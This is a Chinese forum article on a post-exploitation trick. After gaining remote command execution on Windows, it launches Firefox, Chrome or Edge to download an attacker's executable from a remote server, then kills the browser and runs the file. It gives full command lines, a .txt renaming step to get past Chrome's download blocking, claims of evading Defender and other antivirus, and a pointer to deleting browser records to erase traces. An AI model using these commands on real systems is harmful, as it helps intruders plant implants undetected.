# 【真“免”杀】RCE视角下的文件上传BYPASS利用思路

> **来源**: https://forum.butian.net/share/2772  
> **文章ID**: 2772

---

**前言：**  
拿到一个RCE漏洞，只能命令执行，利用场景及其有限，想要上传我们的CS来上线，但是在Windows中，像curl/certutil/powershell/wget命令都不免杀，怎么办？只要学会利用游览器进行后渗透，就能一招鲜吃遍天，目前经测试，包括某60、某绒、defender，都不会对该行为进行拦截，虽然类似的技术分享，之前也有师傅发过，但是这种利用方式其实并非主流，还是有很多兄弟不知道的，导致杀软没有专门对其进行行为查杀，现在某些游览器，例如Chrome，是会对游览器下载的行为进行拦截的，本文也会提供一种“船新”的思路进行绕过。

![image.png](images/attach-8cd2c545d83fef766c0f8b13c2aab352013d0972.png)

**测试环境：**  
目前我用的是Windows Server自带的Defender+某60+某绒，且已经全部都已经升级到了最新版本，包括我们今天的主角游览器，测试用的Edge、火狐、Chrome游览器都已经升级到了最新版本，以验证我们方法的现行可行性，直到本文发出去的这段时间都是有效的。

1. 我们用CMD命令提示符来模拟RCE的真实环境
2. 用python自带的简易http服务来模拟远程下载URL
3. 用我们自己编译的qax.exe来模拟上传的文件  
    ![image.png](images/attach-b036b77343180f2cab9a05484ce5fae41a169cc6.png)

**利用前提条件：**

1. 有RCE漏洞
2. 目标机器是Windows主机
3. 对方有Edge或是火狐、Chrome等第三方游览器

**实验结果如下：**

- 火狐游览器  
    下载EXE，全程无拦截。  
    `"C:\Program Files\Mozilla Firefox\firefox.exe" http://192.168.241.128/qax.exe`  
    `taskkill /im firefox.exe /f && C:\Users\test\Downloads\qax.exe`  
    ![image.png](images/attach-703448bd2b8f1957ace553aa06695efe9c59a614.png)

![image.png](images/attach-1810e899093cfb0ae67c4013ba63185c72d2d856.png)

- Chrome  
    下载EXE/ZIP等常见格式均被拦截，但是有个办法可以进行绕过，就是先将EXE命名为TXT格式，下载后再通过命令把后缀名改回来，谷歌游览器下载文件，并不会对TXT文件进行拦截。  
    `"C:\Program Files\Google\Chrome\Application\chrome.exe" http://192.168.241.128/qax.txt`  
    `taskkill /im chrome.exe /f && copy C:\Users\test\Downloads\qax.txt C:\Users\test\Downloads\qax.exe && C:\Users\test\Downloads\qax.exe`

![image.png](images/attach-02581093058f13a52bf40a5c2d637a25c66937fe.png)

![image.png](images/attach-9752c66c8beae89d9c0d8a651718046e5981ba01.png)

- Edge  
    该游览器的利用方式和chrome同理，这里就不放图了，怕啰嗦，但是如果对方只有IE游览器就不用想了，因为IE游览器默认的安全配置是不允许下载的。

**深入利用探索：**  
这时有兄弟就问了，你这游览器下载会有痕迹呀，其实这个是可以删除的，不过要管理员权限，我记得只要篡改或者删除游览器AppData下的一些db文件就可以实现，游览历史记录和文件下载的内容都可以删除，其实市面上已经有很多相关的文章了，这里就不延展了，感兴趣的兄弟可以自行探索。
